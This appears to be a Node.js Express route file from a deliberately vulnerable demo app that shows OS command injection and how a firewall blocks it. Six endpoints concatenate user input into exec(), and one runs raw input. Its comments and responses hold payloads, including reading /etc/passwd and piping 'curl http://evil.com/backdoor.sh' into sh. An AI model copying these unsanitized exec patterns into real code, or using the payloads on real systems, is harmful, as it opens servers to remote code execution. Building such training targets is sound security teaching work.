const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const os = require('os');

/**
 * ============================================
 * COMMAND INJECTION VULNERABILITIES
 * ============================================
 * 
 * These endpoints demonstrate OS command injection attacks.
 * 
 * WHY THEY SUCCEED WITHOUT FIREWALL:
 * - Direct execution of user input in system commands
 * - No input validation or sanitization
 * - Unsafe use of exec() with concatenated strings
 * 
 * WHY FIREWALL/WAF BLOCKS THEM:
 * - Detects shell metacharacters (; | & ` $ )
 * - Identifies command chaining patterns
 * - Catches common OS commands (cat, ls, whoami, etc.)
 * - Recognizes pipe and redirect operators
 */

// ============================================
// ENDPOINT 1: Ping Command (Classic Injection)
// ============================================
// Attack: POST /api/command/ping with {"host": "127.0.0.1; cat /etc/passwd"}
// Result: Executes arbitrary commands via semicolon
router.post('/ping', (req, res) => {
  const host = req.body.host || '127.0.0.1';

  console.log(`[COMMAND INJECTION ATTEMPT] Ping: ${host}`);

  // VULNERABLE: Direct command concatenation
  const command = `ping -c 3 ${host}`;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection via shell metacharacters',
      example_attack: '{"host": "127.0.0.1; whoami"}',
      note: 'Without firewall, any OS command can be executed'
    });
  });
});

// ============================================
// ENDPOINT 2: DNS Lookup (Pipe Injection)
// ============================================
// Attack: GET /api/command/lookup?domain=example.com | whoami
// Result: Command chaining via pipe operator
router.get('/lookup', (req, res) => {
  const domain = req.query.domain || 'example.com';

  console.log(`[COMMAND INJECTION ATTEMPT] DNS Lookup: ${domain}`);

  // VULNERABLE: Allows pipe operators
  const command = process.platform === 'win32' 
    ? `nslookup ${domain}` 
    : `host ${domain}`;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection via pipe operator',
      example_attack: '?domain=example.com | id',
      note: 'Pipe operator chains multiple commands'
    });
  });
});

// ============================================
// ENDPOINT 3: System Info (Background Execution)
// ============================================
// Attack: GET /api/command/sysinfo?check=uptime & curl http://evil.com/backdoor.sh | sh
// Result: Background command execution
router.get('/sysinfo', (req, res) => {
  const check = req.query.check || 'date';

  console.log(`[COMMAND INJECTION ATTEMPT] System Info: ${check}`);

  // VULNERABLE: Allows background execution
  const command = check;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection with background execution',
      example_attack: '?check=whoami & curl http://evil.com',
      note: 'Ampersand (&) executes commands in background'
    });
  });
});

// ============================================
// ENDPOINT 4: File Analysis (Command Substitution)
// ============================================
// Attack: POST /api/command/analyze with {"filename": "test.txt`whoami`.log"}
// Result: Command substitution via backticks
router.post('/analyze', (req, res) => {
  const filename = req.body.filename || 'test.txt';

  console.log(`[COMMAND INJECTION ATTEMPT] File Analysis: ${filename}`);

  // VULNERABLE: Backtick command substitution
  const command = process.platform === 'win32'
    ? `dir ${filename}`
    : `ls -la ${filename}`;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection via backtick substitution',
      example_attack: '{"filename": "file`id`.txt"}',
      note: 'Backticks execute commands and substitute output'
    });
  });
});

// ============================================
// ENDPOINT 5: Network Test (Multiple Injection Points)
// ============================================
// Attack: POST /api/command/nettest with {"target": "localhost", "port": "80 && cat /etc/passwd"}
// Result: Multiple injection vectors
router.post('/nettest', (req, res) => {
  const { target, port } = req.body;

  console.log(`[COMMAND INJECTION ATTEMPT] Network Test: ${target}:${port}`);

  // VULNERABLE: Multiple unsanitized parameters
  const command = process.platform === 'win32'
    ? `netstat -an | findstr ${port}`
    : `nc -zv ${target} ${port} 2>&1`;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection with multiple injection points',
      example_attack: '{"target": "localhost", "port": "80 && id"}',
      note: 'Both parameters are vulnerable'
    });
  });
});

// ============================================
// ENDPOINT 6: System Process Info
// ============================================
// Attack: GET /api/command/process?name=node$(whoami)
// Result: Command substitution via $()
router.get('/process', (req, res) => {
  const processName = req.query.name || 'node';

  console.log(`[COMMAND INJECTION ATTEMPT] Process Info: ${processName}`);

  // VULNERABLE: $() command substitution
  const command = process.platform === 'win32'
    ? `tasklist | findstr ${processName}`
    : `ps aux | grep ${processName}`;

  exec(command, { timeout: 5000 }, (error, stdout, stderr) => {
    res.json({
      command: command,
      output: stdout || stderr || error?.message,
      vulnerability: 'Command Injection via $() substitution',
      example_attack: '?name=node$(id)',
      note: '$() syntax executes commands inline'
    });
  });
});

// Info endpoint
router.get('/', (req, res) => {
  res.json({
    category: 'OS Command Injection Vulnerabilities',
    description: 'Demonstrates command injection through various system utilities',
    endpoints: {
      'POST /api/command/ping': 'Command injection via ping utility',
      'GET /api/command/lookup?domain=': 'DNS lookup with pipe injection',
      'GET /api/command/sysinfo?check=': 'System info with background execution',
      'POST /api/command/analyze': 'File analysis with backtick substitution',
      'POST /api/command/nettest': 'Network test with multiple injection points',
      'GET /api/command/process?name=': 'Process info with $() substitution'
    },
    example_payloads: {
      semicolon: '127.0.0.1; whoami',
      pipe: 'example.com | id',
      ampersand: 'date & curl http://evil.com',
      backtick: 'file`whoami`.txt',
      dollar_paren: 'node$(id)',
      double_pipe: 'test || cat /etc/passwd'
    },
    shell_metacharacters: [
      '; (command separator)',
      '| (pipe)',
      '& (background)',
      '` (backtick substitution)',
      '$() (command substitution)',
      '&& (AND operator)',
      '|| (OR operator)',
      '> < (redirection)'
    ],
    firewall_detection: [
      'Shell metacharacters detection',
      'Common OS commands (whoami, id, cat, etc.)',
      'Command chaining patterns',
      'Suspicious parameter values'
    ]
  });
});

module.exports = router;
